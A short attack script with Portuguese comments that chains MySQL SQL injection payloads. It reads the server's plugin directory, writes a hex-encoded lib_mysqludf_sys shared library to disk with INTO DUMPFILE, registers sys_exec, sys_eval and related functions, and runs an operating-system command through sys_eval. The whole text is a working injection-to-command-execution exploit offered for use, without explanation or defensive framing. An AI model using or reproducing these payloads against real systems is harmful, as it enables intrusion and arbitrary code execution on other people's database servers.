/* Extracao do valor do parametro plugin_dir */
' and 1=2 union select 1,null,variable_value,null,null,null from information_schema.global_variables where variable_name='PLUGIN_DIR'#


/* Upload da biblioteca dinamica */
' and 1=2 union select '','', 0x7f454c4601010100000000000000000003000300010000007008000034000000141000000000000034002000050028001900180001000000000000000000000000000000180e0000180e0000050000000010000001000000180e0000181e0000181e00000001000008010000060000000010000002000000300e0000301e0000301e0000c8000000c8000000060000000400000004000000d4000000d4000000d40000002400000024000000040000000400000051e5746400000000000000000000000000000000000000000600000004000000040000001400000003000000474e5500cb6251d3f5b71b70aa280052ef07377bb436ef7c11000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000045010000000000000000000012000000a50100000000000000000000120000009d01000000000000000000001200000001000000000000000000000020000000250000000000000000000000200000004b010000000000000000000012000000b200000000000000000000001200000017010000000000000000000012000000530100000000000000000000120000005b010000000000000000000012000000dc000000000000000000000012000000aa01000000000000000000001200000054000000000000000000000012000000c60000000000000000000000120000009801000000000000000000001200000016000000000000000000000022000000e900000000000000000000001200000061010000000000000000000012000000e1000000920a00005900000012000b002c010000620b00000500000012000b0010000000180d00000000000012000c00780000006b0900002500000012000b00f8000000100800000000000012000900c3010000181f0000000000001000f1ff79010000390c00000500000012000b000e0100001e0b00001600000012000b00cf010000201f0000000000001000f1ff9b000000c60900000500000012000b001e010000340b00002e00000012000b00aa000000cb0900003d00000012000b005b000000660900000500000012000b008e000000900900003600000012000b00bc010000181f0000000000001000f1fffe000000190b00000500000012000b00b9000000080a00006f00000012000b0068010000320c00000700000012000b00f0000000eb0a00002e00000012000b0039000000400900002600000012000b008c0100003e0c00009300000012000b00cd000000770a00001b00000012000b003c010000670b0000cb00000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f696e697400737472637079006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f73657400736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d61700077616974706964006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea0100000000000053090000080000007609000008000000b3090000080000001d0a0000080000002e0a000008000000630a000008000000060b0000080000004f0b000008000000960b0000080000002c1e0000080000005b090000020d00007c090000020d0000bb090000020d0000690a0000020d00000e0b0000020d0000570b0000020d0000db090000020700004b0a0000020e0000780b0000020e0000870b0000020e00008c0a0000020b0000de0a0000021100002d0b000002080000a00b000002010000c40b000002060000db0b000002090000ac0c000002090000ec0b0000020a0000fe0b000002120000620c0000020f0000730c000002030000900c000002020000c00c0000020c0000f81e000006040000fc1e000006050000001f000006100000101f000007040000141f0000071000005589e55383ec04e8000000005b81c3e81600008b93f4ffffff85d27405e81e000000e8c9000000e8a4040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8bf00000081c38a1600008d6424f080bb1400000000755c8b83fcffffff85c0740e8d8328ffffff890424e8bbffffff8db320ffffff8d931cffffff29d68b8318000000c1fe0283ee0139f0731f908d7426008d4001898318000000ff94831cffffff8b831800000039f072e6c68314000000018d6424105b5e5dc3eb0d909090909090909090909090905589e553e83000000081c3fb1500008d6424ec8b9324ffffff85d274158b83f8ffffff85c0740b8d9324ffffff891424ffd08d6424145b5dc38b1c24c39090905531c089e583ec088b550c833a007414505068340d0000ff7510e8fcffffff83c410b001c9c35589e55dc35589e55383ec0c8b5d1068660d000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14525268850d0000ff7510e8fcffffff83c410b001c9c35589e55dc35589e55783ec108b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c35589e55383ec048b450c8b5d108338027409525268b00d0000eb448b5004833a007409505068cf0d0000eb33c74204000000008b500c83ec0c8b0283c00203420450e8fcffffff83c41089c28b450889500c31c085d27512515168f70d000053e8fcffffff83c410b0018b5dfcc9c35589e583ec088b45088b400c85c07409894508c9e9fcffffffc9c35589e557565383ec108b450c8b55088b480c8b70088b520c8b098b3689d78d5c0a01f3a489df8b480c8b09c6040a008b480c8b70088b49048b7604f3a48b400c8b4004c60403006a015352e8fcffffff8d65f45b5e5f5d99c35589e583ec088b450c833801750a8b500431c0833a007414515168850d0000ff7510e8fcffffff83c410b001c9c35589e55dc35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e583ec088b450c833801750a8b500431c0833a007414505068850d0000ff7510e8fcffffff83c410b001c9c35589e55dc35589e5575631f65383ec286800040000e8fcffffffc70424010000008945e4e8fcffffffc6000089c38b450c5a5968f50d00008b4008ff30e8fcffffff83c4108945e0eb368b7de431c083c9fff2ae5050f7d1498d3c315753894ddce8fcffffff8b4ddc83c40c51ff75e48d343089c35689fee8fcffffff83c41052ff75e06a04ff75e4e8fcffffff83c41085c075b583ec0cff75e0e8fcffffff83c410803b0075088b4518c60001eb16c64433ff0031c083c9ff89dff2ae8b4514f7d14989088d65f489d85b5e5f5dc35531c089e55dc35589e55dc35583c9ff89e557565383ec1c8b5d0c8b43088b3831c0f2aebf01000000f7d149894de4e8fcffffff83f8007c5c754a83ec0c6a1ee8fcffffff8b55e4595e6a006a00486a218d1410f7d06a0721d0506a00e8fcffffff83c42083f8ff89c67429506631ffff75e48b4308ff3056e8fcffffffffd683c410eb105331ff6a016a0050e8fcffffff83c4108d65f489f85b5e5f5dc39090909090909090909090909090905589e55653e84ffcffff81c31a1200008b8314ffffff83f8ff74198db314ffffff8db426000000008d76fcffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3e0110000e840fbffff595bc9c34e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f29006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e340045787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f72790000000000000000ffffffff00000000ffffffff00000000000000002c1e000001000000b20100000c000000100800000d000000180d0000f5feff6ff8000000050000005804000006000000b80100000a000000f40100000b0000001000000003000000041f000002000000100000001400000011000000170000000008000011000000e0060000120000002001000013000000080000001600000000000000feffff6fa0060000ffffff6f01000000f0ffff6f4c060000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000301e0000000000000000000056080000660800004743433a2028474e552920342e352e3120323031303039323420285265642048617420342e352e312d342900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000b0000000700000002000000d4000000d400000024000000000000000000000004000000000000001e000000f6ffff6f02000000f8000000f8000000c000000003000000000000000400000004000000280000000b00000002000000b8010000b8010000a0020000040000000100000004000000100000003000000003000000020000005804000058040000f40100000000000000000000010000000000000038000000ffffff6f020000004c0600004c060000540000000300000000000000020000000200000045000000feffff6f02000000a0060000a00600004000000004000000010000000400000000000000540000000900000002000000e0060000e006000020010000030000000000000004000000080000005d0000000900000002000000000800000008000010000000030000000a000000040000000800000066000000010000000600000010080000100800003000000000000000000000000400000000000000610000000100000006000000400800004008000030000000000000000000000004000000040000006c00000001000000060000007008000070080000a804000000000000000000001000000000000000720000000100000006000000180d0000180d00001c00000000000000000000000400000000000000780000000100000032000000340d0000340d0000dd00000000000000000000000100000001000000800000000100000002000000140e0000140e000004000000000000000000000004000000000000008a0000000100000003000000181e0000180e00000800000000000000000000000400000000000000910000000100000003000000201e0000200e00000800000000000000000000000400000000000000980000000100000003000000281e0000280e000004000000000000000000000004000000000000009d00000001000000030000002c1e00002c0e00000400000000000000000000000400000000000000aa0000000600000003000000301e0000300e0000c800000004000000000000000400000008000000b30000000100000003000000f81e0000f80e00000c00000000000000000000000400000004000000b80000000100000003000000041f0000040f00001400000000000000000000000400000004000000c10000000800000003000000181f0000180f00000800000000000000000000000400000000000000c6000000010000003000000000000000180f00002c0000000000000000000000010000000100000001000000030000000000000000000000440f0000cf00000000000000000000000100000000000000,'','','' into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'#

/* Criacao das UDFs */
';
CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_bineval RETURNS int SONAME 'lib_mysqludf_sys.so'#

/* Execucao de comando */
' union select 1,null,sys_eval('ping -c 4 192.168.213.10'),null,null,null#

